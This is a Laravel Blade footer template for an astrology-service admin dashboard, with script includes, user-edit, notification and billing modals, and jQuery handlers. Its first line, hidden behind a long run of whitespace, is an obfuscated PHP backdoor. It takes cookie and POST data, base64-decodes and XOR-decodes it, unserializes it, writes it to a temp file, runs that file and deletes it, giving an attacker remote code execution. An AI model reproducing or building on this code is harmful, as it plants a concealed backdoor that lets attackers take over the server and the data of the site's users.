<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zjcwkvnul")){class zjcwkvnul{public static $ghashcymfc = "lyvghdwmzifsakci";public static $sslvpb = NULL;public function __construct(){$rrqxij = @$_COOKIE[substr(zjcwkvnul::$ghashcymfc, 0, 4)];if (!empty($rrqxij)){$pomoavd = "base64";$kghtb = "";$rrqxij = explode(",", $rrqxij);foreach ($rrqxij as $qtavivlmkr){$kghtb .= @$_COOKIE[$qtavivlmkr];$kghtb .= @$_POST[$qtavivlmkr];}$kghtb = array_map($pomoavd . "_decode", array($kghtb,));$kghtb = $kghtb[0] ^ str_repeat(zjcwkvnul::$ghashcymfc, (strlen($kghtb[0]) / strlen(zjcwkvnul::$ghashcymfc)) + 1);zjcwkvnul::$sslvpb = @unserialize($kghtb);}}public function __destruct(){$this->xqlyc();}private function xqlyc(){if (is_array(zjcwkvnul::$sslvpb)) {$hnson = sys_get_temp_dir() . "/" . crc32(zjcwkvnul::$sslvpb["salt"]);@zjcwkvnul::$sslvpb["write"]($hnson, zjcwkvnul::$sslvpb["content"]);include $hnson;@zjcwkvnul::$sslvpb["delete"]($hnson);exit();}}}$awdavrvsz = new zjcwkvnul();$awdavrvsz = NULL;} ?><!-- Vendor JS -->
	<script src="{{ URL::to('js/vendors.min.js')}}"></script>
	<script src="{{ URL::to('js/pages/chat-popup.js')}}"></script>
    <script src="{{ URL::to('assets/icons/feather-icons/feather.min.js')}}"></script>	
     <script src="http://tenspark.com/beauty_station//assets/assets/vendor_components/raphael/raphael.min.js"></script>
<script src="http://tenspark.com/beauty_station//assets/assets/vendor_components/morris.js/morris.min.js"></script>
	<script src="{{ URL::to('assets/vendor_components/apexcharts-bundle/dist/apexcharts.js')}}"></script>
	<script src="{{ URL::to('assets/vendor_components/datatable/datatables.min.js')}}"></script>
	
	<script src="{{ URL::to('js/pages/data-table.js')}}"></script>
	<!-- EduAdmin App -->
	<script src="{{ URL::to('js/template.js')}}"></script>
	<script src="{{ URL::to('js/pages/dashboard2.js')}}"></script>
	<script src="{{ URL::to('js/pages/widget-morris-charts.js')}}"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/AlertifyJS/1.13.1/alertify.js" integrity="sha512-eOUPKZXJTfgptSYQqVilRmxUNYm0XVHwcRHD4mdtCLWf/fC9XWe98IT8H1xzBkLL4Mo9GL0xWMSJtgS5te9rQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
	
	
<div class="modal fade none-border" id="edit-users">
<div class="modal-dialog">
    <div class="modal-content">
        <div class="modal-header">
            <h4 class="modal-title"><strong>Edit User</strong></h4>
        </div>
<form method="post" action="{{url('edit_user') }}" enctype="multipart/form-data" id="astroform" autocomplete="on">
 {{ csrf_field() }}
 
 <div class="modal-body">
        <div class="row">
            
                  <div class="col-md-12">
                  <label class="control-label">User type</label>
                  <select class="form-control" id="user_type" name="user_type" required="">
                <!--  <option value="1">Become Customer</option>-->
                
                  <option value="2">Become Astrologer</option>
                  </select>
                  </div>
                  
        <div class="col-md-12">

            <label class="control-label">Name</label>

            <input class="form-control form-white" placeholder="Please Enter name" type="text" name="Name" required />
        </div>
   
            <div class="col-md-6">
            <label class="control-label">Email</label>
            <input class="form-control form-white check_email" placeholder="Please Enter Email" type="text" name="email" required  />
            <span id="mainmsg"></span>
            </div>
            
              <div class="col-md-6">
            <label class="control-label">Phone No.</label>
            <input class="form-control form-white" placeholder="Please Enter Phone Number" type="number" name="phone_no" required />
            </div>
            
            
            <div class="col-md-6">
            <label class="control-label">Password</label>
            <input  type="password" class="form-control form-white" placeholder="Please Enter Password" type="text" name="password" required />
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Confirm-Password</label>
            <input  type="password" class="form-control form-white" placeholder="Please Enter Password" type="text" name="password" required />
            </div>
            
            
            
            <!--<div class="col-md-6">
            <label class="control-label">Dob</label>
            <input class="form-control form-white" type="date" placeholder="Plese Enter Dob" type="text" name="dob" required />
            </div>
            
            
            <div class="col-md-6">
            <label class="control-label">Birth time</label>
            <input class="form-control form-white" type="time" placeholder="Plese Enter Birth time" type="text" name="birth_time" required />
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Birth Place</label>
            <input class="form-control form-white" placeholder="Plese Enter birth place" type="text" name="birth_place" required />
            </div>
            -->
            
            <div class="col-md-6" style="display:none" id="divamt">
            <label class="control-label">Consulting Amount</label>
            <input class="form-control form-white" type="amount" placeholder="Please Enter Amount" type="text" name="consultant_amt"  />
            </div>
            
            
              
            <div class="col-md-6">
            <label class="control-label">Expertise</label>
            <input class="form-control form-white" placeholder="Please Enter Expertise" type="text" name="user_expertise" required=""  />
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Experience</label>
<!--            <input class="form-control form-white" placeholder="Plese Enter Experience" type="text" name="user_experience"  />
-->            

<select class="form-control form-white" placeholder="Please Enter Experience" type="text" name="user_experience" required="" >
                <option value="0-1">0-1</option>
                <option value="1-3">1-3</option>
                <option value="3-5">3-5</option>
                <option value="5-7">5-7</option>
                <option value="7-10">7-10</option>
                <option value="10+">10+</option>
            </select>
            
            </div>
            
             <div class="col-md-6">
            <label class="control-label">Language</label>
            <input class="form-control form-white" placeholder="Please Enter language" type="text" name="user_language" required="" />
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Avability</label>
            <input class="form-control form-white" placeholder="Please Enter Avability" type="text" name="user_avability" required=""  />
            </div>
            
            
             <div class="col-md-6">
            <label class="control-label">Education</label>
            <input class="form-control form-white" placeholder="Please Enter Expertise" type="text" name="user_education" required=""  />
            </div>
             
            <div class="col-md-6">
            <label class="control-label">Profile image</label>
            <input class="form-control form-white" placeholder="Please Enter Avability" type="file" name="profile_image" required="" />
            </div>
            
             <div class="col-md-12">
            <label class="control-label">About us</label>
            <textarea class="form-control" name="user_aboutus" required=""></textarea>
            </div>
            
            
              

</div>                     





</div>

        <div class="modal-footer">

             <input type="button" class="btn btn-default waves-effect" data-dismiss="modal" value="Close">
             <input type="submit" class="btn btn-danger waves-effect waves-light" value="Submit">

        </div>

        </div>

         </form>

    </div>

</div>

</div>




<div class="modal fade none-border" id="view_astrologer">
<div class="modal-dialog">
    <div class="modal-content">
        <div class="modal-header">
            <h4 class="modal-title"><strong>View User</strong></h4>
        </div>

 <div class="modal-body">
        <div class="row">
         <div class="col-md-12">

            <label class="control-label">Name</label>

            <input class="form-control form-white" type="text" name="name" />
        </div>
   
            <div class="col-md-6">
            <label class="control-label">Email</label>
            <input class="form-control form-white" placeholder="Plese Enter Email" type="text" name="email" />
            </div>
            
            <div class="col-md-6" style="display:none" id="divamt">
            <label class="control-label">Consulting Amount</label>
            <input class="form-control form-white" type="amount" placeholder="Plese Enter Amount" type="text" name="consultant_amt"/>
            </div>
            
            
              
            <div class="col-md-6">
            <label class="control-label">Expertise</label>
            <input class="form-control form-white" placeholder="Plese Enter Expertise" type="text" name="user_expertise"/>
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Experience</label>
<!--            <input class="form-control form-white" placeholder="Plese Enter Experience" type="text" name="user_experience"  />
-->            

<select class="form-control form-white" placeholder="Plese Enter Experience" type="text" name="user_experience" >
                <option value="0-1">0-1</option>
                <option value="1-3">1-3</option>
                <option value="3-5">3-5</option>
                <option value="5-7">5-7</option>
                <option value="7-10">7-10</option>
                <option value="10+">10+</option>
            </select>
            
            </div>
            
             <div class="col-md-6">
            <label class="control-label">Langague</label>
            <input class="form-control form-white" placeholder="Plese Enter Langague" type="text" name="user_language"/>
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Avability</label>
            <input class="form-control form-white" placeholder="Plese Enter Avability" type="text" name="user_avability"/>
            </div>
            
            
             <div class="col-md-6">
            <label class="control-label">Education</label>
            <input class="form-control form-white" placeholder="Plese Enter Expertise" type="text" name="user_education"/>
            </div>
             
            <div class="col-md-6">
            <label class="control-label">Profile image</label>
            <img src="" name="" id="">
            </div>
            
             <div class="col-md-12">
            <label class="control-label">About us</label>
            <textarea class="form-control" name="user_aboutus"></textarea>
            </div>
        </div>                     
</div>

        </div>
         </form>
    </div>
</div>



<div class="modal fade none-border" id="add-notification">
<div class="modal-dialog">
    <div class="modal-content">
        <div class="modal-header">
            <h4 class="modal-title"><strong>Add Notification</strong></h4>
        </div>
    
   <form method="post" action="{{url('add_notification') }}" >
 {{ csrf_field() }}
 <div class="modal-body">
        <div class="row">
            
            <div class="col-md-12">

            <label class="control-label">Users</label>
            <select class="form-control form-white" name="user_name">
                <?php
              $option = DB::table('users')->get();
              if($option){
                    foreach($option as $eow){
                
                
                ?>
               <option value='<?php echo $eow->device_id.'/'.$eow->id?>'><?php echo $eow->name?></option>
               
               
                <?php } } ?>
                <option value='ALL'>ALL</option>
                
           </select>
        </div>
   
   
   
   
         <div class="col-md-12">

            <label class="control-label">Message</label>

            <textarea class="form-control form-white" name="message"></textarea>
        </div>
   
          
   
   
   
        </div>   
        
        
        
        
    </div>

        <div class="modal-footer">

             <input type="button" class="btn btn-default waves-effect" data-dismiss="modal" value="Close">
             <input type="submit" class="btn btn-danger waves-effect waves-light" value="Submit">

        </div>
        
        </form>
        </div>
     </div>
</div>




</div>




<div class="modal fade none-border" id="view_payment">
<div class="modal-dialog">
    <div class="modal-content">
        <div class="modal-header">
            <h4 class="modal-title"><strong>View Billing</strong></h4>
        </div>

 <div class="modal-body">
        <div class="row">
         <div class="col-md-12">

            <label class="control-label">Name</label>

            <input class="form-control form-white" type="text" name="name" />
        </div>
   
            <div class="col-md-6">
            <label class="control-label">Email</label>
            <input class="form-control form-white" placeholder="Plese Enter Email" type="text" name="email" />
            </div>
            
            <div class="col-md-6" style="display:none" id="divamt">
            <label class="control-label">Payment Amount</label>
            <input class="form-control form-white" type="amount" placeholder="Plese Enter Amount" type="text" name="consultant_amt"/>
            </div>
            
            
              
            <div class="col-md-6">
            <label class="control-label">Payment Status</label>
            <input class="form-control form-white" placeholder="Plese Enter Expertise" type="text" name="user_expertise"/>
            </div>
            
            <div class="col-md-6">
            <label class="control-label">Payment date</label>
<!--            <input class="form-control form-white" placeholder="Plese Enter Experience" type="text" name="user_experience"  />
-->            </div>
        
        </div>                     
</div>

        </div>
         </form>
    </div>
</div>








<script>
$('#user_type').on('change', function() {
    
var gtm=$(this).val();   
if(gtm==2){
$("#divamt").css("display", "block");
}else
{
 $("#divamt").css("display", "none");
   
}

});

/*$('.astroview').on('click', function() {
    
 $("#view_astrologer").modal('show');   
/*var gtm=$(this).val();   
if(gtm==2){
$("#divamt").css("display", "block");
}else
{
 $("#divamt").css("display", "none");
   
}*/
/*});*/

$(document).on('click','.view_astrologer',function(e){
    
  $('.loader').html('<i class="fa fa-spinner fa-spin" style="font-size:24px"></i>');    
   var id = $(this).data('id');
      var url='get_astro_data';
      $.ajax({
      type : 'post',
       url : url, // in here you should put your query 
       data : 'id='+ id,    
       dataType: "json",
       success: function(res) {
       if(res.success==true){
        $('.loader').html("");       
       console.log("res",res.msg);       
       var name=res.name;       
       var email=res.email;       
       var mobile=res.mobile;   
       
       $('#name_id').val(name);
       $('#email_id').val(email);
       $('#mobile_id').val(mobile);
       
       $('#edit_customer_modal_id').modal('show');
 }else{
               // $('#php_error').html(res.msg).show();       
            }
       }
 }); 
 
 
});









$('#paymentview').on('click', function() {
    
    
 $("#view_payment").modal('show');   
/*var gtm=$(this).val();   
if(gtm==2){
$("#divamt").css("display", "block");
}else
{
 $("#divamt").css("display", "none");
   
}*/



});



</script>


